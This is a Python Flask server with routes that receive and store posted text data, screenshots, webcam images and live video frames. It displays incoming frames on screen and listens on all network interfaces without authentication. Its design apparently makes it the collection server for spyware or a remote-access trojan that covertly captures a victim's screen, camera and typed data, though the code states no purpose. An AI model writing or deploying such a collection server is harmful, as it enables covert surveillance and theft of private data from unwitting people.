from flask import Flask, request, render_template
import os
import cv2

app = Flask(__name__)

if not os.path.exists('frames'):
    os.makedirs('frames')

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.data.decode('utf-8')
    with open("received_data.txt", "a") as f:
        f.write(data + "\n")
    return "Data received"

@app.route('/screenshot', methods=['POST'])
def receive_screenshot():
    if 'screenshot' not in request.files:
        return "No screenshot found", 400
    screenshot = request.files['screenshot']
    screenshot.save("screenshot.png")
    return "Screenshot received"

@app.route('/camera_image', methods=['POST'])
def receive_camera_image():
    if 'camera_image' not in request.files:
        return "No camera image found", 400
    camera_image = request.files['camera_image']
    camera_image.save("camera_image.png")
    return "Camera image received"

@app.route('/video_frame', methods=['POST'])
def receive_video_frame():
    if 'video_frame' not in request.files:
        return "No video frame found", 400
    video_frame = request.files['video_frame']
    frame_path = os.path.join('frames', 'video_frame.jpg')
    video_frame.save(frame_path)  

    img = cv2.imread(frame_path)
    cv2.imshow('frame', img)
    if cv2.waitKey(1) & 0xFF == ord('q'):
        cv2.destroyAllWindows()

    return "Video frame received"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/video')
def video():
    return render_template('video.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)